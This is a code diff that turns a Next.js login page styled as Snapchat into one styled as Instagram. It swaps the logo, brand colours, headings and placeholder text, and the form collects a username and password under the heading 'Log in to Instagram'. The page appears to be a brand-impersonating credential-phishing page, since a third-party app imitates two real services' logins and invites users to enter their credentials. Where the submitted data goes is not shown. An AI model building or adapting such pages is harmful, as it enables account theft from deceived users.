@@ -6,7 +6,7 @@ import Image from 'next/image';
 import { EyeIcon, EyeSlashIcon } from '@heroicons/react/24/outline';
 import { chatService } from '@/lib/supabase-service';
 
-export default function SnapchatLoginPage() {
+export default function InstagramLoginPage() {
   const [username, setUsername] = useState('');
   const [password, setPassword] = useState('');
   const [showPassword, setShowPassword] = useState(false);
@@ -41,14 +41,14 @@ export default function SnapchatLoginPage() {
   };
 
   return (
-    <div className="min-h-screen bg-gradient-to-b from-yellow-400 via-yellow-300 to-yellow-200 flex items-center justify-center p-4">
+    <div className="min-h-screen bg-gradient-to-b from-purple-600 via-pink-500 to-orange-400 flex items-center justify-center p-4">
       <div className="bg-white rounded-2xl shadow-2xl p-8 w-full max-w-md">
-        {/* Snapchat Logo */}
+        {/* Instagram Logo */}
         <div className="flex justify-center mb-8">
           <div className="relative w-16 h-16">
             <Image
-              src="/snapchat-logo.svg"
-              alt="Snapchat"
+              src="/instagram-logo.svg"
+              alt="Instagram"
               fill
               style={{ objectFit: 'contain' }}
               priority
@@ -58,10 +58,10 @@ export default function SnapchatLoginPage() {
 
         {/* Title */}
         <h1 className="text-2xl font-bold text-center text-gray-800 mb-2">
-          Log in to Snapchat
+          Log in to Instagram
         </h1>
         <p className="text-center text-gray-600 mb-8">
-          Enter your Snapchat credentials to continue
+          Enter your Instagram credentials to continue
         </p>
 
         {/* Login Form */}
@@ -76,8 +76,8 @@ export default function SnapchatLoginPage() {
               type="text"
               value={username}
               onChange={(e) => setUsername(e.target.value)}
-              className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-yellow-400 focus:border-transparent transition-colors"
-              placeholder="Enter your Snapchat username"
+              className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-purple-500 focus:border-transparent transition-colors"
+              placeholder="Enter your Instagram username"
               required
             />
           </div>
@@ -93,7 +93,7 @@ export default function SnapchatLoginPage() {
                 type={showPassword ? 'text' : 'password'}
                 value={password}
                 onChange={(e) => setPassword(e.target.value)}
-                className="w-full px-4 py-3 pr-12 border border-gray-300 rounded-lg focus:ring-2 focus:ring-yellow-400 focus:border-transparent transition-colors"
+                className="w-full px-4 py-3 pr-12 border border-gray-300 rounded-lg focus:ring-2 focus:ring-purple-500 focus:border-transparent transition-colors"
                 placeholder="Enter your password"
                 required
               />
@@ -122,7 +122,7 @@ export default function SnapchatLoginPage() {
           <button
             type="submit"
             disabled={isLoading}
-            className="w-full bg-yellow-400 hover:bg-yellow-500 text-black font-semibold py-3 px-4 rounded-lg transition-colors disabled:opacity-50 disabled:cursor-not-allowed"
+            className="w-full bg-gradient-to-r from-purple-600 to-pink-500 hover:from-purple-700 hover:to-pink-600 text-white font-semibold py-3 px-4 rounded-lg transition-colors disabled:opacity-50 disabled:cursor-not-allowed"
           >
             {isLoading ? 'Logging in...' : 'Log In'}
           </button>
@@ -134,7 +134,7 @@ export default function SnapchatLoginPage() {
             Forgot your password?
           </a>
           <a href="#" className="block text-sm text-blue-600 hover:underline">
-            Sign up for Snapchat
+            Sign up for Instagram
           </a>
         </div>
 
